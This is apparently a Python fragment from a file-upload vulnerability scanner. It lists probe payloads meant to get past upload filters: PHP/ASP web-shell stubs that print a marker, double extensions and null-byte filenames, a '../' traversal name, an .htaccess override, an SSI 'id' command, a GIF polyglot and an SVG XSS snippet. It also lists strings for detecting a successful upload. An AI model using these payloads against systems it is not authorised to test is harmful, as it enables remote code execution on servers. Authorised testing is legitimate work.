
QUICK_PAYLOADS = [
    ("shell.php",        "<?php echo 'gung12_probe'; ?>",      "application/x-php"),
    ("shell.php.jpg",    "<?php echo 'gung12_probe'; ?>",      "image/jpeg"),
    ("shell.phtml",      "<?php echo 'gung12_probe'; ?>",      "application/x-php"),
    ("shell.jpg.php",    "<?php echo 'gung12_probe'; ?>",      "image/jpeg"),
    (".htaccess",        "AddType application/x-httpd-php .jpg", "text/plain"),
    ("shell.php%00.jpg", "<?php echo 'gung12_probe'; ?>",      "image/jpeg"),
]

FULL_PAYLOADS = [
    ("shell.php3",       "<?php echo 'gung12_probe'; ?>",      "application/x-php"),
    ("shell.php5",       "<?php echo 'gung12_probe'; ?>",      "application/x-php"),
    ("shell.shtml",      "<!--#exec cmd=\"id\" -->",           "text/html"),
    ("shell.asp",        "<% Response.Write('gung12_probe') %>", "text/plain"),
    ("shell.aspx",       '<%@ Page Language="C#" %><% Response.Write("gung12_probe"); %>', "text/plain"),
    ("polyglot.php.gif", "GIF89a<?php echo 'gung12_probe'; ?>", "image/gif"),
    ("shell.svg",        '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', "image/svg+xml"),
    ("shell.xml.php",    "<?php echo 'gung12_probe'; ?>",      "text/xml"),
    ("../shell.php",     "<?php echo 'gung12_probe'; ?>",      "application/x-php"),
    ("shell.php.",       "<?php echo 'gung12_probe'; ?>",      "application/x-php"),
]

DETECTION_PATTERNS = [
    "gung12_probe",
    "upload successful",
    "file uploaded",
    "successfully uploaded",
    "file has been uploaded",
    "upload complete",
    "shell.php",
    "shell.phtml",
    ".php has been",
    "file saved",
    "your file",
]
